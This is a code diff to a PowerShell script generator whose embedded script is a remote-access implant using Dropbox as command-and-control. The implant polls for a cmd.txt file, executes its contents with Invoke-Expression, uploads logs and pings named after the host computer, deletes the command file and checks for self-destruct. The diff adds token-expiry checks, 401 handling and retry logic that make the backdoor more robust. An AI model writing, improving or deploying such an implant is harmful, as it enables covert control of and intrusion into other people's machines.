@@ -364,12 +364,14 @@ Add-Type -AssemblyName System.Web
 `$clientSecret = "$($CurrentProfile.AppSecret)"
 `$refreshToken = "$($CurrentProfile.RefreshToken)"
 `$accessToken = `$null
+`$tokenExpiryTime = `$null
 `$responseTime = $responseTime
 `$pingDelay = $pingDelay
 `$computerName = `$env:COMPUTERNAME
 `$logFileName = "log_`${computerName}.txt"
 `$lastPingTime = Get-Date
 `$startupTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
+`$firstRun = `$true
 
 function Get-AccessToken {
     `$uri = "https://api.dropbox.com/oauth2/token"
@@ -381,11 +383,38 @@ function Get-AccessToken {
     }
     try {
         `$response = Invoke-RestMethod -Uri `$uri -Method Post -Body `$body -ContentType "application/x-www-form-urlencoded"
+        `$global:tokenExpiryTime = (Get-Date).AddSeconds(12600)
         return `$response.access_token
     }
     catch {
         Write-Host "Failed to get access token: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
         return `$null
+    }
+}
+
+function Test-AccessToken {
+    param(`$accessToken)
+    if (-not `$accessToken) {
+        return `$false
+    }
+    if (`$tokenExpiryTime -and ((`$tokenExpiryTime - (Get-Date)).TotalMinutes -gt 30)) {
+        return `$true
+    }
+    `$uri = "https://api.dropboxapi.com/2/users/get_current_account"
+    `$headers = @{
+        Authorization = "Bearer `$accessToken"
+        "Content-Type" = "application/json"
+    }
+    try {
+        `$response = Invoke-RestMethod -Uri `$uri -Method Post -Headers `$headers -Body "{}"
+        `$global:tokenExpiryTime = (Get-Date).AddSeconds(12600)
+        return `$true
+    }
+    catch {
+        if (`$_.Exception.Response.StatusCode -eq 401) {
+            return `$false
+        }
+        return `$true
     }
 }
 
@@ -429,6 +458,9 @@ function Upload-File {
         return `$true
     }
     catch {
+        if (`$_.Exception.Response.StatusCode -eq 401) {
+            return `$false
+        }
         Write-Host "Failed to upload file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
         return `$false
     }
@@ -448,6 +480,9 @@ function Read-FileContent {
         return `$response
     }
     catch {
+        if (`$_.Exception.Response.StatusCode -eq 401) {
+            return `$null
+        }
         Write-Host "Failed to read file content: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
         if (`$_.Exception.Response) {
             `$reader = New-Object System.IO.StreamReader(`$_.Exception.Response.GetResponseStream())
@@ -473,6 +508,9 @@ function Delete-File {
         return `$true
     }
     catch {
+        if (`$_.Exception.Response.StatusCode -eq 401) {
+            return `$false
+        }
         Write-Host "Failed to delete file: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
         return `$false
     }
@@ -491,7 +529,9 @@ function Append-ToLog {
     `$success = Upload-File -accessToken `$accessToken -localContent `$newContent -remotePath "/`$logFileName"
     if (-not `$success) {
         Write-Host "Failed to append to log file" -ForegroundColor DarkRed
+        return `$false
     }
+    return `$true
 }
 
 function Update-LastPing {
@@ -513,8 +553,10 @@ function Update-LastPing {
     `$success = Upload-File -accessToken `$accessToken -localContent `$newContent -remotePath "/`$logFileName"
     if (-not `$success) {
         Write-Host "Failed to update last ping" -ForegroundColor DarkRed
+        return `$false
     } else {
         Write-Host "Updated last ping for `$logFileName" -ForegroundColor White
+        return `$true
     }
 }
 
@@ -523,19 +565,24 @@ function Process-CommandFile {
     `$command = Read-FileContent -accessToken `$accessToken
     if (-not `$command) {
         Write-Host "No command found or error reading file" -ForegroundColor DarkRed
-        return
+        return `$false
     }
     try {
         Write-Host "Executing command: `$command" -ForegroundColor White
         Invoke-Expression `$command
         `$currentTime = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
         `$commandLogMessage = "# EXECUTED COMMAND ON `$(`$currentTime)`n`$(`$command)"
-        Append-ToLog -accessToken `$accessToken -message `$commandLogMessage
+        `$logSuccess = Append-ToLog -accessToken `$accessToken -message `$commandLogMessage
+        if (-not `$logSuccess) {
+            return `$false
+        }
     }
     catch {
         Write-Host "Failed to execute command: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
+        return `$false
     }
-    Delete-File -accessToken `$accessToken | Out-Null
+    `$deleteSuccess = Delete-File -accessToken `$accessToken
+    return `$deleteSuccess
 }
 
 function Check-SelfDestruct {
@@ -581,36 +628,50 @@ function Check-SelfDestruct {
 }
 
 while (`$true) {
-    if (-not `$accessToken) {
+    if (-not `$accessToken -or -not (Test-AccessToken -accessToken `$accessToken)) {
+        Write-Host "Acquiring new access token..." -ForegroundColor DarkYellow
         `$accessToken = Get-AccessToken
         if (-not `$accessToken) {
-            Write-Host "Failed to obtain access token, retrying in 5 seconds..." -ForegroundColor DarkRed
-            Start-Sleep 5
+            Write-Host "Failed to obtain access token, retrying in 30 seconds..." -ForegroundColor DarkRed
+            Start-Sleep 30
             continue
         }
-        Update-LastPing -accessToken `$accessToken
-        `$startupMessage = "# STARTUP ON `$startupTime"
-        Append-ToLog -accessToken `$accessToken -message `$startupMessage
-        Write-Host "Startup logged: `$startupMessage" -ForegroundColor White
+        Write-Host "Access token acquired successfully" -ForegroundColor DarkGreen
+        if (`$firstRun) {
+            Update-LastPing -accessToken `$accessToken | Out-Null
+            `$startupMessage = "# STARTUP ON `$startupTime"
+            Append-ToLog -accessToken `$accessToken -message `$startupMessage | Out-Null
+            Write-Host "Startup logged: `$startupMessage" -ForegroundColor White
+            `$firstRun = `$false
+        }
     }
     try {
         Check-SelfDestruct -accessToken `$accessToken
         `$file = Check-DropboxFile -accessToken `$accessToken -fileName "cmd.txt"
         if (`$file) {
             Write-Host "Found command, processing..." -ForegroundColor DarkGreen
-            Process-CommandFile -accessToken `$accessToken
+            `$success = Process-CommandFile -accessToken `$accessToken
+            if (-not `$success) {
+                Write-Host "Command processing failed" -ForegroundColor DarkYellow
+                `$accessToken = `$null
+            }
         } else {
             Write-Host "Checking every `$responseTime seconds..." -ForegroundColor White
         }
         `$currentTime = Get-Date
         if ((`$currentTime - `$lastPingTime).TotalSeconds -ge `$pingDelay) {
-            Update-LastPing -accessToken `$accessToken
-            `$lastPingTime = `$currentTime
+            `$pingSuccess = Update-LastPing -accessToken `$accessToken
+            if (-not `$pingSuccess) {
+                Write-Host "Ping update failed" -ForegroundColor DarkYellow
+                `$accessToken = `$null
+            } else {
+                `$lastPingTime = `$currentTime
+            }
         }
     }
     catch {
-        `$accessToken = `$null
         Write-Host "Error in main loop: `$(`$_.Exception.Message)" -ForegroundColor DarkRed
+        `$accessToken = `$null
     }
     Start-Sleep `$responseTime
 }
